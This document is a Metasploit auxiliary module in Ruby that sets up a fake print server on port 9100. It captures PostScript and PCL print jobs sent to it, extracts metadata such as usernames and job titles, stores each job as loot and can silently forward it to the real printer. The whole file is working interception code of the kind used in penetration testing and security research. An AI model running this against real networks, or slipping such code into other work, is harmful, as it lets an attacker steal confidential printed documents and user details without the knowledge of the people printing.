##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Remote::TcpServer
    include Msf::Exploit::Remote::Tcp
    include Msf::Auxiliary::Report

    def initialize
        super(
            'Name'        => 'Printjob capture service',
            'Version'     => '$Revision$',
            'Description' => %q{
                This module is designed to provide listen on a set port for PJL or PostScript print
                jobs. Once a print job is detected it is saved to disk / loot. The captured printjob
                can then be forwarded on to another printer if required.
            },
            'Author'      =>     'Chris John Riley',
            'License'     =>     MSF_LICENSE,
            'References'    =>
                [
                    # general
                    ['URL', 'http://blog.c22.cc'],
                ],
            'Actions'     =>
                [
                    [ 'Capture' ]
                ],
            'PassiveActions' =>
                [
                'Capture'
                ],
            'DefaultAction'  => 'Capture'
        )

        register_options([
            OptPort.new('SRVPORT',      [ true, 'The local port to listen on', 9100 ]),
            OptAddress.new('SRVHOST',   [ true, 'The local host to listen on', '0.0.0.0' ]),
            OptBool.new('FORWARD',      [ true, 'Forward print jobs to another host', false ]),
            OptPort.new('RPORT',        [ false, 'Forward to remote port', 9100 ]),
            OptAddress.new('RHOST',     [ false, 'Forward to remote host' ]),
            OptBool.new('METADATA',     [ true, 'Display Metadata from printjobs', true ]),
            OptString.new('MODE',     [ true, 'RAW or LPR', 'RAW' ]),

        ], self.class)

        deregister_options('SSL', 'SSLVersion', 'SSLCert')

    end

    def setup
        super
        @state = {}
        @data = ''
     end

    def run
        begin

            @srvhost = datastore['SRVHOST']
            @srvport = datastore['SRVPORT'] || 9100

            if datastore['FORWARD']
                @forward = datastore['FORWARD']
                @mode = datastore['MODE'].upcase || 'RAW'
                @rport = datastore['RPORT'] || 9100
                if not datastore['RHOST'].nil?
                    @rhost = datastore['RHOST']
                    print_status("#{name}: Forwarding all printjobs to #{@rhost}:#{@rport}")
                else
                    raise ArgumentError, "#{name}: Cannot forward without a valid RHOST"
                end
            end
            @metadata = datastore['METADATA']
            @verbose = datastore['VERBOSE']

            print_status("#{name}: Starting Print Server on %s:%s - %s mode" % [@srvhost, @srvport, @mode])

            exploit()

        rescue  =>  ex
            print_error(ex.message)
        end
    end

    def on_client_connect(c)
        @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
        print_status("#{name}: Client connection from #{c.peerhost}:#{c.peerport}")
        @data = ''
    end

    def on_client_data(c)
        curr_data = c.get_once
        @data << curr_data
        if @mode == 'RAW'
            # RAW Mode
        elsif @mode == 'LPR' or @mode == 'LPD'
            response = stream_data(curr_data)
            c.put(response)
        else
            raise ArgumentError, "Mode set incorrectly - please use RAW or LPR"
        end

        if (Rex::Text.to_hex(curr_data.first)) == '\x02' and (Rex::Text.to_hex(curr_data.last)) == '\x0a'
            print_status("#{name}: LPR Jobcmd \"%s\" received" % curr_data[1..-2])
        end

        return if not @data
    end

    def on_client_close(c)
        print_status("#{name}: Client #{c.peerhost}:#{c.peerport} closed connection after %d bytes of data" % @data.length)
        sock.close if sock

        @prn_src = c.peerhost
        @prn_title, @prn_type = ''
        @prn_metadata = {}
        @meta_output = []

        begin
            if @data.include?("%!PS-Adobe")
                @prn_type = "Postscript"
                @prn_metadata = @data.scan(/^%%(.*)$/i)
                print_good("#{name}: Printjob intercepted - type #{@prn_type}")
                @prn_metadata.each do | meta |
                    if meta[0] =~ /^Title|^Creat(or|ionDate)|^For|^Target|^Language/i
                        @meta_output << meta[0].to_s
                    end
                    if meta[0] =~/^Title/i
                        @prn_title = meta[0].strip
                    end
                end

            elsif @data.include?("LANGUAGE=PCL") or @data.include?("LANGUAGE=PCLXL")
                @prn_type = "PCL"
                @prn_metadata = @data.scan(/^@PJL\s(JOB=|SET\s|COMMENT\s)(.*)$/i)
                print_good("#{name}: Printjob intercepted - type #{@prn_type}")
                @prn_metadata.each do | meta |
                    if meta[0] =~ /^COMMENT/i
                        @meta_output << meta[0].to_s + meta[1].to_s
                    end
                    if meta[1] =~ /^NAME|^STRINGCODESET|^RESOLUTION|^USERNAME|^JOBNAME|^JOBATTR/i
                        @meta_output << meta[1].to_s
                    end
                    if meta[1] =~ /^NAME/i
                        @prn_title = meta[1].strip
                    elsif meta[1] =~/^JOBNAME/i
                        @prn_title = meta[1].strip
                    end
                end
            else
                # OTHER
            end

            if @meta_output and @metadata
                @meta_output.sort.each do | out |
                    print_status("#{out}")
                end
            end
            @prn_title = 'Unnamed' if not @prn_title
            storefile if not @data.empty?

            if @forward and @mode == 'RAW'
                forward_data(@data)
            end

            @data = '' # clear data
            @state.delete(c)

        rescue  =>  ex
            print_error(ex.message)
        end
    end

    def forward_data(data_to_send)
        print_status("#{name}: Forwarding PrintJob on to #{@rhost}:#{@rport}")
        connect
        sock.put(data_to_send)
        sock.close
    end

    def stream_data(data_to_send)
        if @verbose
            print_status("#{name}: Streaming %d bytes of data to #{@rhost}:#{@rport}" % data_to_send.length)
        end
        connect if not sock
        sock.put(data_to_send)
        response = sock.get_once
        return response
    end

    def storefile
        # store the file
        if @data
            loot = store_loot(
                    "prn_snarf",
                    @prn_type,
                    @prn_src,
                    @data,
                    @prn_title,
                    "PrintJob Snarfer"
                    )
            print_good("Incoming printjob - %s saved to loot" % @prn_title)
            print_good("Loot filename: %s" % loot)
        end
    end
end